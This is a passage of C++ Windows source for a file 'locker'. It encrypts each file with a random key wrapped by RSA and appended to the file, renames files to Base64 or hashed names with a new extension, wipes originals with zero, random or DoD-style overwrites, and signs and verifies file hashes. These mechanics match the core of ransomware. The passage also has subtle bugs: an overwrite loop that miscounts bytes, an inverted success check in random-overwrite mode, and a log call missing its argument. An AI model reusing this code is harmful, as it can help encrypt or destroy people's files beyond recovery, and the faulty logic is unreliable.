	{
		LOG_ERROR(L"[EncryptRSA] Failed File ReadFile; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
		goto END;
	}
	

	if (global::GetDeCrypt() == EncryptCipher::CRYPT)
	{
		if(!HandleError
		(
			BCryptEncrypt
			(
				FileInfo->CryptInfo->desc.handle_rsa_key,
				FileBuffer, FileInfo->Filesize,
				NULL, NULL, 0,
				FileBuffer, FileInfo->CryptInfo->desc.size, &dwDataLen, BCRYPT_PAD_PKCS1))
			)
		{
			LOG_ERROR(L"[CryptEncrypt] Failed; %ls", FileInfo->Filename);			
			goto END;
		}
	}
	else if (global::GetDeCrypt() == EncryptCipher::DECRYPT)
	{
		if (!HandleError
		(
			BCryptDecrypt
			(
				FileInfo->CryptInfo->desc.handle_rsa_key,
				FileBuffer, FileInfo->CryptInfo->desc.size,
				NULL, NULL, 0,
				FileBuffer, FileInfo->CryptInfo->desc.size, &dwDataLen,
				BCRYPT_PAD_PKCS1))
			)
		{
			LOG_ERROR(L"[BCryptDecrypt] Failed");
			goto END;
		}		
	}

	if (!WriteFullData(FileInfo->newFileHandle, FileBuffer, dwDataLen))
	{
		LOG_ERROR(L"[WriteFullData] Failed to write. GetLastError = %lu\n", GetLastError());
		goto END;
	}
	
	SUCCESS_return = TRUE;
	
END:	
	if (FileBuffer)
	{
		memory::memzero_explicit(FileBuffer, FileInfo->CryptInfo->desc.size);
		memory::m_free(FileBuffer);
	}
	
	return SUCCESS_return;
}




STATIC BOOL GenKey
(
	PFILE_INFO FileInfo,	
	BYTE* CryptKey,
	BYTE* CryptIV,
	BYTE* EncryptedKey
)
{
	DWORD writeData = 0;

	if (!HandleError
	(BCryptGenRandom(0, CryptKey, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
	{
		LOG_ERROR(L"[BCryptGenRandom] Failed");
		return FALSE;
	}

	if (!HandleError
	(BCryptGenRandom(0, CryptIV, 8, BCRYPT_USE_SYSTEM_PREFERRED_RNG)))
	{
		LOG_ERROR(L"[BCryptGenRandom] Failed");
		return FALSE;
	}
	

#ifdef DEBUG
	memcpy(CryptKey, "________________________________", 32);
	memcpy(CryptIV, "11111111", 8);
#endif

	FileInfo->CryptInfo->gen_key_method(FileInfo->ctx, CryptKey, CryptIV);	
	
	memory::Copy(EncryptedKey, CryptKey, 32);
	memory::Copy(EncryptedKey + 32, CryptIV, 8);

#ifdef DEBUG
	printf("KEY_TO_CRYPT\n");
	for (size_t i = 0; i < 40; ++i)
		printf_s("%02X", EncryptedKey[i]);
	printf_s("\nENDKEY\n");

	if (!HandleError
	(
		BCryptEncrypt
		(
			FileInfo->CryptInfo->desc.handle_rsa_key,
			EncryptedKey, 512,
			NULL, NULL, 0,
			EncryptedKey, FileInfo->CryptInfo->desc.size, &writeData, BCRYPT_PAD_NONE))		
		)
	{
		LOG_ERROR(L"Failed crypt RSA key. GetLastError = %lu.", GetLastError());
		return FALSE;
	}

	for (size_t i = 0; i < writeData; ++i)
		printf_s("%02X", EncryptedKey[i]);
	printf_s("\n");
#endif
	
	if (!HandleError
	(
		BCryptEncrypt
		(
			FileInfo->CryptInfo->desc.handle_rsa_key,
			EncryptedKey, 40,
			NULL, NULL, 0,
			EncryptedKey, FileInfo->CryptInfo->desc.size, &writeData, BCRYPT_PAD_PKCS1))
		)
	{
		LOG_ERROR(L"[BCryptEncrypt] Failed");
		return FALSE;
	}
		

#ifdef DEBUG
	for (size_t i = 0; i < writeData; ++i)
		printf_s("%02X", EncryptedKey[i]);
	printf_s("\n");
#endif

	return TRUE;
}


STATIC BOOL WriteEncryptInfo
(
	PFILE_INFO FileInfo,
	BYTE* EncryptedKey,	
	EncryptModes EncryptMode
)
{
	
	BYTE Buffer[4] = { 0 };
	Buffer[0] = static_cast<INT>(EncryptMode) + 100;	
	std::string strbit = std::to_string(FileInfo->CryptInfo->desc.size);
	memcpy_s((VOID*)&Buffer[1], 3, strbit.c_str(), strbit.size());
	LARGE_INTEGER Offset;
	Offset.QuadPart = 0;
	
	if (!SetFilePointerEx(FileInfo->newFileHandle, Offset, NULL, FILE_END))
	{
		LOG_ERROR(L"[WriteEncryptInfo] Failed to write info; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
		return FALSE;
	}

	if (!WriteFullData(FileInfo->newFileHandle, EncryptedKey, FileInfo->CryptInfo->desc.size))
	{
		LOG_ERROR(L"[WriteEncryptInfo] Failed to write info; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
		return FALSE;
	}

	if (!WriteFullData(FileInfo->newFileHandle, Buffer, 4))
	{
		LOG_ERROR(L"[WriteEncryptInfo] Failed to write info; %ls; GetLastError = %lu", FileInfo->Filename, GetLastError());
		return FALSE;
	}

	return TRUE;
}

BOOL filesystem::FileCryptEncrypt
(
	PFILE_INFO FileInfo
)
{
	BOOL SUCCESS_return = FALSE;		
	EncryptModes mode = global::GetEncMode();
	
	BYTE* EncryptedKey = (BYTE*)memory::m_malloc(FileInfo->CryptInfo->desc.size);
	BYTE CryptIV[8];
	BYTE CryptKey[32];


	if (!GenKey(FileInfo, CryptKey, CryptIV, EncryptedKey))
	{
		LOG_ERROR(L"[GenKey] Failed to generate key; %ls");
		goto END;
	}
	
	if (!OptionEncryptMode(FileInfo, mode))
		goto END;

	WriteEncryptInfo(FileInfo, EncryptedKey, mode);
	
	SUCCESS_return = TRUE;
END:
	if (EncryptedKey)
	{
		memory::memzero_explicit(EncryptedKey, FileInfo->CryptInfo->desc.size);
		memory::memzero_explicit(CryptIV, 8);
		memory::memzero_explicit(CryptKey, 32);
		memory::m_free(EncryptedKey);
	}

	return SUCCESS_return;
}



STATIC BYTE* ReadEncryptInfo
(
	HANDLE handle,
	DWORD* Bit,
	EncryptModes* mode_
)
{
	LARGE_INTEGER Offset;	
	Offset.QuadPart = -4;

	if (!SetFilePointerEx(handle, Offset, NULL, FILE_END))
	{
		LOG_ERROR(L"[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
		return NULL;
	}
	BYTE ReadInfo[4];
	if (!ReadFile(handle, ReadInfo, 4, NULL, NULL))
	{
		LOG_ERROR(L"[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
		return NULL;
	}
	
	INT mode = ReadInfo[0] - 100;
	INT size_bit = 0;
	for (int i = 1; i < 4; ++i)
		size_bit = size_bit * 10 + (ReadInfo[i] - '0');		
	BYTE* read_key = (BYTE*)memory::m_malloc(size_bit);	
	Offset.QuadPart = -(size_bit + 4);
	if (!SetFilePointerEx(handle, Offset, NULL, FILE_END))
	{
		LOG_ERROR(L"[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
		return NULL;
	}
	if (!ReadFile(handle, read_key, size_bit, NULL, NULL))
	{
		LOG_ERROR(L"[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
		return NULL;
	}
	Offset.QuadPart = 0;
	if (!SetFilePointerEx(handle, Offset, NULL, FILE_BEGIN))
	{
		LOG_ERROR(L"[ReadEncryptInfo] Failed to read file info. GetLastError = %lu", GetLastError());
		return NULL;
	}
#ifdef DEBUG
	for (size_t i = 0; i < size_bit; ++i)
		printf_s("%02X", read_key[i]);
	printf_s("\n");
#endif
	
	*Bit = size_bit + 4;	
	*mode_ = static_cast<EncryptModes>(mode);
	return read_key;
}


BOOL filesystem::FileCryptDecrypt
(
	PFILE_INFO FileInfo
)
{
	BOOL SUCCESS_return = FALSE;	
	DWORD EncryptedKeySize = 0;
	DWORD written;		
	EncryptModes mode = global::GetEncMode();
	BYTE CryptIV[8];
	BYTE CryptKey[32];
	BYTE* EncryptedKey = ReadEncryptInfo(FileInfo->FileHandle, &EncryptedKeySize, &mode);
	if (EncryptedKey == NULL)	goto END;
	FileInfo->Filesize -= EncryptedKeySize;
	if (SetFilePointer(FileInfo->FileHandle, -(LONG)EncryptedKeySize, NULL, FILE_END))
	{
		SetEndOfFile(FileInfo->FileHandle);
		SetFilePointer(FileInfo->FileHandle, 0, NULL, FILE_BEGIN);
	}
	
	if (!HandleError
	(
		BCryptDecrypt(FileInfo->CryptInfo->desc.handle_rsa_key,
			EncryptedKey, FileInfo->CryptInfo->desc.size,
			NULL, NULL, 0,
			EncryptedKey, 40, &written,
			BCRYPT_PAD_PKCS1))
		)
	{
		LOG_ERROR(L"[BCryptDecrypt] Failed");		
		goto END;
	}
	

#ifdef DEBUG
	printf("ECNRYPTED_KEY\n");
	for (size_t i = 0; i < 40; ++i)
		printf_s("%02X", EncryptedKey[i]);
	printf_s("\n");
#endif

	memory::Copy(CryptKey, EncryptedKey, 32);
	memory::Copy(CryptIV, EncryptedKey + 32, 8);	
	FileInfo->CryptInfo->gen_key_method(FileInfo->ctx, CryptKey, CryptIV);
	

	if (!OptionEncryptMode(FileInfo, mode))
		goto END;
	
	SUCCESS_return = TRUE;
END:		
	if (EncryptedKey)
	{
		memory::memzero_explicit(EncryptedKey, written);
		memory::memzero_explicit(CryptKey, 32);
		memory::memzero_explicit(CryptIV, 8);
		memory::m_free(EncryptedKey);
	}
	
	return SUCCESS_return;
}


STATIC VOID dump_hash(CONST BYTE* hash, size_t len) 
{		
	std::lock_guard<std::mutex> lock(g_MutexBcrypt);
	for (size_t i = 0; i < len; ++i) printf("%02X", hash[i]);
	printf("\n");
}

VOID filesystem::sort_hash_list(SLIST<HASH_LIST>* list)
{
	SLIST<locker::HLIST>* list_sorted = new SLIST<locker::HLIST>;
	std::multimap<u32, BYTE*> map;
	locker::PHLIST DataHash = NULL;
	SLIST_FOREACH(DataHash, list)	
		map.insert({ memory::MurmurHash2A(DataHash->hash, 32, 0), DataHash->hash});
	
	for (auto& e : map)
	{
		locker::PHLIST hash_sorted = new locker::HLIST;
		hash_sorted->hash = e.second;
		hash_sorted->hash_size = 32;
		list_sorted->SLIST_INSERT_HEAD(hash_sorted);
	}

	*list = *list_sorted;

#ifdef DEBUG
	printf("DumpHash\n");
	DataHash = NULL;
	SLIST_FOREACH(DataHash, list)
		dump_hash(DataHash->hash, 32);

	printf("\n\n");
#endif
}


BOOL filesystem::HashSignatureFile
(
	SLIST<HASH_LIST>* list,	
	HANDLE HandleHash
)
{
	DWORD BytesRead;
	BYTE* Buffer = (BYTE*)memory::m_malloc(1048576);
	if (!Buffer)
	{
		LOG_ERROR(L"[HashSignatureFile] Failed alloc memory");
		return FALSE;
	}	
	
	sha256_state ctx;
	sha256_init_context(&ctx);
	size_t hash_s = 32;
	BYTE* out = (BYTE*)memory::m_malloc(hash_s);
	SetFilePointer(HandleHash, 0, NULL, FILE_BEGIN);
	while (ReadFile(HandleHash, Buffer, 1048576, &BytesRead, NULL) && BytesRead != 0)
		sha256_update_context(&ctx, Buffer, BytesRead);

	sha256_final_context(&ctx, out);
	

	HLIST* hash = new HLIST;
	hash->hash = out;
	hash->hash_size = hash_s;
	list->SLIST_INSERT_HEAD_SAFE(hash);
	
	memory::m_free(Buffer);
	return TRUE;
}


BOOL filesystem::CreateSignatureFile
(
	SLIST<HASH_LIST>* HashList
)
{	
	BOOL success = FALSE;
	NTSTATUS status;
	PHASH_LIST DataHash = NULL;
	FILE_INFO FileInfo{};
	CRYPT_INFO CryptInfo = {};

	WCHAR* PathLocale = NULL;
	DWORD len = 0;
	
	BYTE* SignatureBuffer = NULL;
	DWORD ResultLength = 0;

	if (global::GetPathSignRSAKey() == NULL)
	{
		LOG_ERROR(L"[CreateSignatureFile] Failed; missing path key to signature");
		return FALSE;
	}
		
	CryptInfo.desc.key_data = (BYTE*)memory::m_malloc(4096);
	CryptInfo.desc.crypto_provider = NULL;
	CryptInfo.desc.handle_rsa_key = NULL;
	CryptInfo.desc.rsa_path = global::GetPathSignRSAKey();
	global::SetDeCrypt(EncryptCipher::DECRYPT);
	if (!ReadRSAFile(&CryptInfo))
	{
		LOG_ERROR(L"[ReadRSAFile] Failed; %ls", CryptInfo.desc.rsa_path);		
		goto end;
	}
	if (CryptInfo.desc.crypto_provider == NULL || CryptInfo.desc.handle_rsa_key == NULL)
	{
		LOG_ERROR(L"[DESCRIPTOR - PROVIDER] Failed; %ls", CryptInfo.desc.rsa_path);		
		goto end;
	}


	PathLocale = (WCHAR*)memory::m_malloc((MAX_PATH + MAX_PATH) * sizeof(WCHAR));
	len = GetCurrentDirectoryW(MAX_PATH, PathLocale);
	if (!len)
	{
		LOG_ERROR(L"[CreateSignatureFile] [GetCurrentDirectoryW] Failed");
		goto end;
	}
	wmemcpy(&PathLocale[len], L"\\signature.laced.txt", 20);
	FileInfo.newFilename = PathLocale;
	if (!CreateFileOpen(&FileInfo, CREATE_ALWAYS) || FileInfo.newFileHandle == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR(L"[CreateSignatureFile] Failed; %ls", PathLocale);
		goto end;
	}
	
	BYTE hash_sha[32];
	{
		sha256_state ctx;
		sha256_init_context(&ctx);
		SLIST_FOREACH(DataHash, HashList)
			sha256_update_context(&ctx, DataHash->hash, DataHash->hash_size);
		sha256_final_context(&ctx, hash_sha);
	}
	LOG_INFO(L"[CreateSignatureFile] Dump Hash");
	dump_hash(hash_sha, 32);
	
	SignatureBuffer = (BYTE*)memory::m_malloc(CryptInfo.desc.size);
	if (SignatureBuffer == NULL)
	{
		LOG_ERROR(L"[BAD_ALLOC] Failed");
		goto end;
	}

	BCRYPT_PKCS1_PADDING_INFO paddingInfo;
	paddingInfo.pszAlgId = BCRYPT_SHA256_ALGORITHM;

	if (!HandleError
	(
			BCryptSignHash
			(
				CryptInfo.desc.handle_rsa_key, &paddingInfo,
				hash_sha, 32,
				SignatureBuffer, CryptInfo.desc.size,
				&ResultLength, 
				BCRYPT_PAD_PKCS1)
			)
		)
	{
		LOG_ERROR(L"[BCryptSignHash] Failed");
		goto end;
	}
#ifdef DEBUG
	printf("DumpInfo\n");
	dump_hash(SignatureBuffer, ResultLength);
#endif 

	if (!WriteFullData(FileInfo.newFileHandle, SignatureBuffer, ResultLength))
	{
		LOG_ERROR(L"[CreateSignatureFile] [WriteFullData] Failed; %ls; GetLastError = %lu", PathLocale, GetLastError());
		goto end;
	}

	LOG_SUCCESS(L"[CreateSignatureFile] SUCCESS; Signature saved in: %ls", PathLocale);
	success = TRUE;
end:
	if(SignatureBuffer)
		memory::m_free(SignatureBuffer);
	if (PathLocale)
		memory::m_free(PathLocale);
	if (CryptInfo.desc.key_data)
	{
		memory::memzero_explicit(CryptInfo.desc.key_data, 4096);
		memory::m_free(CryptInfo.desc.key_data);
	}
	if (FileInfo.newFileHandle)
		CloseHandle(FileInfo.newFileHandle);

	return success;
}

BOOL filesystem::VerificationSignatureFile
(
	SLIST<HASH_LIST>* HashList	
)
{
	BOOL success = FALSE;
	NTSTATUS status;
	PHASH_LIST DataHash = NULL;
	FILE_INFO FileInfo{};
	CRYPT_INFO CryptInfo = {};

	WCHAR* PathLocale = NULL;
	DWORD len = 0;

	DWORD SignatureLength = 0;
	BYTE* SignatureBuffer = NULL;	

	if (global::GetPathSignRSAKey() == NULL)
	{
		LOG_ERROR(L"[CreateSignatureFile] Failed; missing path key to signature");
		return FALSE;
	}

	CryptInfo.desc.key_data = (BYTE*)memory::m_malloc(4096);
	CryptInfo.desc.crypto_provider = NULL;
	CryptInfo.desc.handle_rsa_key = NULL;
	CryptInfo.desc.rsa_path = global::GetPathSignRSAKey();
	global::SetDeCrypt(EncryptCipher::CRYPT);
	if (!ReadRSAFile(&CryptInfo))
	{
		LOG_ERROR(L"[ReadRSAFile] Failed; %ls", CryptInfo.desc.rsa_path);
		goto end;
	}
	if (CryptInfo.desc.crypto_provider == NULL || CryptInfo.desc.handle_rsa_key == NULL)
	{
		LOG_ERROR(L"[DESCRIPTOR - PROVIDER] Failed; %ls", CryptInfo.desc.rsa_path);
		goto end;
	}

	PathLocale = (WCHAR*)memory::m_malloc((MAX_PATH + MAX_PATH) * sizeof(WCHAR));
	len = GetCurrentDirectoryW(MAX_PATH, PathLocale);
	if (!len)
	{
		LOG_ERROR(L"[VerificationSignatureFile] [GetCurrentDirectoryW] Failed");
		goto end;
	}
	wmemcpy(&PathLocale[len], L"\\signature.laced.txt", 20);
	FileInfo.FilePath = PathLocale;
	if (!getParseFile(&FileInfo) || FileInfo.FileHandle == INVALID_HANDLE_VALUE)
	{
		LOG_ERROR(L"[VerificationSignatureFile] [getParseFile] Failed; %ls", PathLocale);
		goto end;
	}

	SignatureBuffer = (BYTE*)memory::m_malloc(FileInfo.Filesize);	
	if(!ReadFile(FileInfo.FileHandle, SignatureBuffer, FileInfo.Filesize, &SignatureLength, NULL) && SignatureLength != 0)
	{
		LOG_ERROR(L"[VerificationSignatureFile] [ReadFile] Failed; %ls; GetLastError = %lu", PathLocale, GetLastError());
		goto end;
	}

	BYTE hash_sha[32];
	{
		sha256_state ctx;
		sha256_init_context(&ctx);
		SLIST_FOREACH(DataHash, HashList)
			sha256_update_context(&ctx, DataHash->hash, DataHash->hash_size);
		sha256_final_context(&ctx, hash_sha);
	}

	LOG_INFO(L"[VerificationSignatureFile] Dump Hash");
	dump_hash(hash_sha, 32);

	BCRYPT_PKCS1_PADDING_INFO paddingInfo;
	paddingInfo.pszAlgId = BCRYPT_SHA256_ALGORITHM;		
	if (!HandleError
		(
			status = BCryptVerifySignature
			(
				CryptInfo.desc.handle_rsa_key, &paddingInfo,
				hash_sha, 32,
				SignatureBuffer, SignatureLength, 
				BCRYPT_PAD_PKCS1)
			)
		)
	{
		LOG_ERROR(L"[BCryptVerifySignature] Failed; %ls", PathLocale);
		if (status == 0xC000A000)
			LOG_ERROR(L"[BCryptVerifySignature] The cryptographic signature is INVALID");
		goto end;
	}
	else
		LOG_SUCCESS(L"[BCryptVerifySignature] The cryptographic signature is VALID");


	success = TRUE;
end:

	if(PathLocale) 
		memory::m_free(PathLocale);
	if(SignatureBuffer)
		memory::m_free(SignatureBuffer);
	if (CryptInfo.desc.key_data)
	{
		memory::memzero_explicit(CryptInfo.desc.key_data, 4096);
		memory::m_free(CryptInfo.desc.key_data);
	}
	if (FileInfo.FileHandle)
		CloseHandle(FileInfo.FileHandle);
	
	return success;
}

/*	TODO:	*/
VOID filesystem::RootKeySignatureTrust(VOID)
{
//	SLIST<HASH_LIST>* HashListRoot = new SLIST<HASH_LIST>;
//	BYTE* g_PublicKeyRoot = NULL;
//	BYTE* g_PrivateKeyRoot = NULL;
//	DWORD size = 0;
//	FILE_INFO FileInfo;
//	FileInfo.FilePath = global::GetPath();
//	if (!getParseFile(&FileInfo))
//		goto end;
//	HashSignatureFile(HashListRoot, &FileInfo);	
//	
//	if (global::GetStatus())
//	{
//		locker::LoadPrivateRootKey(&g_PrivateKeyRoot, &size);
//		if (!g_PrivateKeyRoot)
//		{
//			LOG_ERROR(L"Failed Load Public Root Key\n");
//			goto end;
//		}
//		//CreateSignatureFile(HashListRoot, (WCHAR*)L"\\SignatureUserKey.txt", g_PrivateKeyRoot, size);
//	}
//	else
//	{		
//		locker::LoadPublicRootKey(&g_PublicKeyRoot, &size);
//		if (!g_PublicKeyRoot)
//		{
//			LOG_ERROR(L"Failed Load Public Root Key\n");
//			goto end;
//		}
//		//VerificationSignatureFile(HashListRoot, (WCHAR*)L"\\SignatureUserKey.txt", g_PublicKeyRoot, size);
//	}
//
//end:
//	if (g_PublicKeyRoot)
//	{
//		memory::memzero_explicit(g_PublicKeyRoot, size);
//		memory::m_free(g_PublicKeyRoot);
//	}
//		
//	if (g_PrivateKeyRoot)
//	{
//		memory::memzero_explicit(g_PrivateKeyRoot, size);
//		memory::m_free(g_PrivateKeyRoot);
//	}
//	
//	PHASH_LIST Data = NULL;
//	SLIST_FOREACH(Data, HashListRoot)
//		delete[] Data->hash;
//	delete HashListRoot;
}


STATIC VOID SafeURLBase64(WCHAR* str, size_t size, size_t mode)
{
	if (mode == BASE_CRYPT)
	{
		for (INT i = 0; i < size; ++i)
		{
			if (str[i] == L'-')
			{
				str[i] = L'+';
				continue;
			}
			if (str[i] == L'_')
			{
				str[i] = L'/';
			}
		}
	}
	else if (mode == BINARY_CRYPT)
	{
		for (INT i = 0; i < size; ++i)
		{
			if (str[i] == L'+')
			{
				str[i] = L'-';
				continue;
			}
			if (str[i] == L'/')
			{
				str[i] = L'_';
			}
		}
	}
}

WCHAR* filesystem::MakeCopyFile(WCHAR* Path, WCHAR* Filename, WCHAR* exst, WCHAR* FPath)
{
	size_t len_path = memory::StrLen(Path);
	size_t len_filename = memory::StrLen(Filename);
	size_t len_FPath = memory::StrLen(FPath);	

	if (memory::StrStrCW(exst, ECRYPT_NAME_P))
	{		
		size_t len = len_FPath - ECRYPT_NAME_LEN;
		WCHAR* name = (WCHAR*)memory::m_malloc((260) * sizeof(WCHAR));
		wmemcpy_s(name, len, FPath, len);
		
		if (global::GetCryptName() == Name::BASE64_NAME)
		{
			SafeURLBase64(&name[len_path + 1], len_filename - ECRYPT_NAME_LEN, BASE_CRYPT);

			VOID* Base64 = NULL;
			DWORD size;			
			if (!Base64Encode(&Base64, (BYTE*)&name[len_path + 1], 0, &size, BASE_CRYPT_W))
			{
				LOG_ERROR(L"Failed MakeCopyFile convert Base64 file %ls. GetLastError = %lu\n", Filename, GetLastError());
				goto END;
			}
			if (Base64 == NULL)
			{
				LOG_ERROR(L"Failed MakeCopyFile convert Base64 file %ls. GetLastError = %lu\n", Filename, GetLastError());
				goto END;
			}				
			WCHAR* FullPath = (WCHAR*)memory::m_malloc((len_path + 2 + size) * sizeof(WCHAR));
			wmemcpy_s(FullPath, len_path, Path, len_path);
			FullPath[len_path] = L'\\';					
			
			MultiByteToWideChar(CP_UTF8, 0, (CHAR*)Base64, size, &FullPath[len_path + 1], size);

			memory::m_free(Base64);
			memory::m_free(name);
			return FullPath;
		}
	END:
		return name;
	}
	else
	{
		if (global::GetCryptName() == Name::HASH_NAME)
		{
			CHAR ptr[260] = { 0 };
			u8 out[32] = { 0 };
			WideCharToMultiByte(CP_UTF8, 0, Filename, -1, ptr, len_filename, NULL, NULL);
			sha256((CONST u8*)ptr, len_filename, out);
			u8* name = memory::BinaryToHex(out, 32);
			WCHAR* FullPath = (WCHAR*)memory::m_malloc((len_path + 2 + 64 + 6) * sizeof(WCHAR));
			wmemcpy_s(FullPath, len_path, Path, len_path);
			FullPath[len_path] = L'\\';
			MultiByteToWideChar(CP_UTF8, 0, (CHAR*)name, 64, &FullPath[len_path + 1], 64);
			wmemcpy_s(&FullPath[memory::StrLen(FullPath)], ECRYPT_NAME_LEN, ECRYPT_NAME_P, ECRYPT_NAME_LEN);
			return FullPath;
		}
		if (global::GetCryptName() == Name::BASE64_NAME)
		{						
			if ((len_filename + (len_filename / 3)) > MAX_PATH)
			{
				LOG_ERROR(L"(Size + size / 3) must be smaller than 260smbls. File: %ls\n", Filename);
				goto END_;
			}
						
			CHAR ptr[260] = { 0 };				
			WideCharToMultiByte(CP_UTF8, 0, Filename, -1, ptr, len_filename, NULL, NULL);
			

			VOID* Base64 = NULL;
			DWORD size;
			if (!Base64Encode(&Base64, (BYTE*)ptr, len_filename, &size, BINARY_CRYPT_W))
			{
				LOG_ERROR(L"Failed MakeCopyFile convert Base64 file %ls. GetLastError = %lu\n", Filename, GetLastError());
				goto END_;
			}
			if (Base64 == NULL)
			{
				LOG_ERROR(L"Failed MakeCopyFile convert Base64 file %ls. GetLastError = %lu\n", Filename, GetLastError());
				goto END_;
			}
						
			WCHAR* FullPath = (WCHAR*)memory::m_malloc((len_path + size + ECRYPT_NAME_LEN + 2) * sizeof(WCHAR));
			wmemcpy_s(FullPath, len_path, Path, len_path);
			FullPath[len_path] = L'\\';
			wmemcpy_s(&FullPath[len_path + 1], size, (WCHAR*)Base64, size);
			wmemcpy_s(&FullPath[size + len_path + 1], ECRYPT_NAME_LEN, ECRYPT_NAME_P, ECRYPT_NAME_LEN);			
			SafeURLBase64(&FullPath[len_path + 1], size, BINARY_CRYPT);

			memory::m_free(Base64);
			return FullPath;
		}
	END_:
		std::wstring wstr(FPath);
		wstr += std::wstring(ECRYPT_NAME_P);
		WCHAR* ret = (WCHAR*)memory::m_malloc((wstr.size() + 1) * sizeof(WCHAR));
		wmemcpy_s(ret, wstr.size(), wstr.c_str(), wstr.size());
		return ret;
	}

	WCHAR* empty = (WCHAR*)memory::m_malloc((ECRYPT_NAME_LEN + 1) * sizeof(WCHAR));
	memcpy_s(empty, ECRYPT_NAME_LEN, ECRYPT_NAME_P, ECRYPT_NAME_LEN);
	return empty;
}


STATIC BOOL Write(FILE_INFO* fi, BYTE* buff)
{
	size_t size_mb = 1048576;  // 1 MB	
	SetFilePointer(fi->FileHandle, 0, NULL, FILE_BEGIN);
	auto fsize = fi->Filesize;
	DWORD toWrite;
	DWORD written = 0;
	while (fsize > 0)
	{
		toWrite = (DWORD)fsize >= size_mb ? size_mb : fsize;
		if (!WriteFullData(fi->FileHandle, buff, toWrite))
		{
			LOG_ERROR(L"Failed WriteFullData in OverWriteFile %ls. GetLastError = %lu\n", fi->FilePath, GetLastError());
			return FALSE;
		}
		written += toWrite;
		fsize -= written;
	}
	
	return TRUE;
}

BOOL filesystem::OverWriteFile(PFILE_INFO FileInfo)
{
	if (global::GetModeOverWrite() == ZEROS)
	{
		BYTE* zeros = (BYTE*)memory::m_malloc(1048576);
		memory::memzero_explicit(zeros, 1048576);
		for (int i = 0; i < global::GetCountOverWrite(); ++i)
		{
			if (!Write(FileInfo, zeros))						
				return FALSE;			
		}
		memory::m_free(zeros);
	}
	else
	{

		BYTE* random = (BYTE*)memory::m_malloc(1048576);
		HCRYPTPROV CryptoProvider = 0;
		if (!CryptAcquireContextA(&CryptoProvider, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
		{
			LOG_ERROR(L"Failed create provider in OverWriteFile. GetLastError = %lu.\n", GetLastError());
			memory::m_free(random);
			return FALSE;
		}
		CryptGenRandom(CryptoProvider, 1048576, random);

		if (global::GetModeOverWrite() == RANDOM)
		{
			for (int i = 0; i < global::GetCountOverWrite(); ++i)
			{
				if (Write(FileInfo, random))
					return FALSE;
			}
		}
		else if (global::GetModeOverWrite() == DOD)
		{
			BYTE* zeros = (BYTE*)memory::m_malloc(1048576); // 1 MB
			memory::memzero_explicit(zeros, 1048576);
			for (int i = 0; i < global::GetCountOverWrite(); ++i)
			{
				if (!Write(FileInfo, zeros))
					return FALSE;
				if (!Write(FileInfo, random))
					return FALSE;
			}
			memory::m_free(zeros);
		}
		memory::m_free(random);
		if (CryptoProvider)
			CryptReleaseContext(CryptoProvider, 0);
	}
	return TRUE;
}
